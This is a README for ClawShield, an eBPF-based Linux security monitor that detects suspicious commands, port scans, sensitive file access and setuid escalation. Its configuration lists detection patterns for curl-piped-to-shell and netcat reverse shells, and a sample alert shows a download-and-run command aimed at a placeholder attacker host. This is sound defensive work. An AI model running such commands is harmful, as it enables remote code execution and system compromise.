# ClawShield eBPF Security Monitor

Kernel-level security monitoring using eBPF (Extended Berkeley Packet Filter). This module provides real-time detection of:

- **Process Execution** - Suspicious command patterns, fork bombs
- **Network Connections** - Port scanning, suspicious ports, unauthorized destinations
- **File Access** - Sensitive file reads/writes (/etc/shadow, /etc/sudoers, SSH keys)
- **Privilege Escalation** - setuid to root attempts

## Architecture

```
┌─────────────────────────────────────────────────────────────┐
│                     Linux Kernel                            │
│  ┌─────────────┐ ┌─────────────┐ ┌─────────────┐           │
│  │ execve()    │ │ connect()   │ │ openat2()   │ syscalls  │
│  └──────┬──────┘ └──────┬──────┘ └──────┬──────┘           │
│         │               │               │                   │
│  ┌──────▼──────────────▼───────────────▼─────┐             │
│  │              eBPF Probes (kprobes)        │             │
│  └──────────────────────┬────────────────────┘             │
└─────────────────────────┼───────────────────────────────────┘
                          │ perf buffer
              ┌───────────▼───────────┐
              │  clawshield-ebpf      │
              │  (Python + BCC)       │
              │                       │
              │  • Pattern matching   │
              │  • Threshold checks   │
              │  • Alert routing      │
              └───────────┬───────────┘
                          │
        ┌─────────────────┼─────────────────┐
        ▼                 ▼                 ▼
   ┌─────────┐      ┌──────────┐     ┌───────────┐
   │ Console │      │ Log file │     │ Telegram  │
   └─────────┘      └──────────┘     └───────────┘
```

## Requirements

- Linux kernel 4.4+ with BPF enabled
- BCC (BPF Compiler Collection)
- Python 3.8+
- Root privileges (for eBPF loading)

### Install BCC on Ubuntu/Debian

```bash
sudo apt install bpfcc-tools python3-bpfcc
```

## Quick Start

```bash
# Run directly (development)
sudo python3 cmd/clawshield-ebpf/main.py -c config/default.yaml

# Install as service
sudo cp clawshield-ebpf.service /etc/systemd/system/
sudo systemctl enable clawshield-ebpf
sudo systemctl start clawshield-ebpf
```

## Configuration

See `config/default.yaml` for all options:

```yaml
# Enable/disable detectors
detectors:
  process_execution: true
  network_connections: true
  file_access: true
  privilege_escalation: true

# Thresholds
thresholds:
  fork_bomb_threshold: 50   # Rapid child spawning
  port_scan_threshold: 20   # Unique ports from single process

# Allowlists (won't trigger alerts)
allowlist:
  processes:
    - /usr/bin/apt
    - /usr/bin/node

# Suspicious patterns
suspicious:
  commands:
    - "curl.*|.*sh"    # Pipe curl to shell
    - "nc -e"          # Netcat reverse shell
  files:
    - /etc/shadow
    - /etc/sudoers
  network:
    - 4444    # Metasploit default
    - 31337   # Leet port
```

## Alerts

### Console Output
```
[14:32:15] HIGH: Suspicious Command Execution
  PID: 12345
  Command: bash
  Path: curl http://evil.com/x.sh | bash
```

### Telegram
Alerts are sent to the configured Telegram chat with severity icons and markdown formatting.

### Log File
JSON-lines format at `/var/log/clawshield/ebpf.log`:
```json
{"timestamp": "2026-02-09T14:32:15", "severity": "high", "title": "Suspicious Command Execution", "details": {...}}
```

## Integration with ClawShield

The eBPF monitor works alongside:
- **clawshield-fw** (Firewall) - Network-layer egress blocking
- **clawshield-proxy** (Proxy) - MCP traffic interception

Together they provide defense-in-depth:
1. eBPF detects suspicious behavior at kernel level
2. Firewall blocks unauthorized network destinations
3. Proxy enforces policy on MCP tool calls

## Detectors

### Process Execution (`trace_execve`)
- Attaches to `__x64_sys_execve`
- Detects: reverse shells, fork bombs, malicious scripts
- Pattern matching on command arguments

### Network Connections (`trace_connect`)
- Attaches to `tcp_v4_connect`
- Detects: port scanning, C2 ports, suspicious destinations
- Tracks unique port counts per process

### File Access (`trace_openat`)
- Attaches to `do_sys_openat2`
- Detects: shadow file reads, sudoers tampering, SSH key access
- Monitors sensitive paths

### Privilege Escalation (`trace_setuid`)
- Attaches to `__x64_sys_setuid`
- Detects: any non-root process calling setuid(0)
- Critical severity alerts

## Troubleshooting

### "BPF not supported"
```bash
# Check kernel config
zcat /proc/config.gz | grep BPF
# Should show CONFIG_BPF=y, CONFIG_BPF_SYSCALL=y
```

### "Cannot attach kprobe"
```bash
# Check available probes
sudo bpftrace -l 'kprobe:*execve*'
```

### High CPU Usage
Reduce buffer sizes in code or increase poll timeout:
```python
b["events"].open_perf_buffer(handler, page_cnt=16)  # Reduce from 64
```

## Development

```bash
# Quick test (one-liner)
sudo python3 -c "from bcc import BPF; print('BCC works!')"

# Run with debug output
sudo python3 cmd/clawshield-ebpf/main.py -c config/default.yaml 2>&1 | tee debug.log
```
